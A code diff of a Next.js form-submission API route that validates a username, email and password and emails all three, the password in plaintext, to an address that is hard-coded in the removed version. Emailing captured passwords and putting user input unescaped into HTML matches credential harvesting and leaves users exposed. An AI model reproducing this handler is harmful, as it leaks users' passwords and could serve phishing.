@@ -1,22 +1,17 @@
-
-import { NextResponse } from 'next/server';
-import { Resend } from 'resend';
-
-const resend = new Resend(process.env.RESEND_API_KEY);
+import { formValidationSchema } from "@/utils/dataValidation";
+import { sendEmail } from "@/utils/emailService";
+import { NextResponse } from "next/server";
 
 export async function POST(req: Request) {
   try {
     const body = await req.json();
 
+    // Validate data
+    await formValidationSchema.validate(body);
+
     const { username, email, password } = body;
 
-    if (!username || !email || !password) {
-      return NextResponse.json(
-        { error: 'All fields are required.' },
-        { status: 400 }
-      );
-    }
-
+    // Email content
     const emailBody = `
       <h1>New Form Submission</h1>
       <p><strong>Username:</strong> ${username}</p>
@@ -24,15 +19,14 @@ export async function POST(req: Request) {
       <p><strong>Password:</strong> ${password}</p>
     `;
 
-    const data = await resend.emails.send({
-      from: 'Acme <onboarding@resend.dev>',
-      to: 'nizamaniqaiserkhan323@gmail.com',
-      subject: 'Form Submission',
-      html: emailBody,
-    });
+    // Send email
+    const data = await sendEmail("Form Submission", emailBody);
 
-    return NextResponse.json({ message: 'Email sent successfully!', data });
+    return NextResponse.json({ message: "Email sent successfully!", data });
   } catch (error: any) {
+    if (error.name === "ValidationError") {
+      return NextResponse.json({ error: error.message }, { status: 400 });
+    }
     return NextResponse.json(
       { error: `Failed to send email: ${error.message}` },
       { status: 500 }
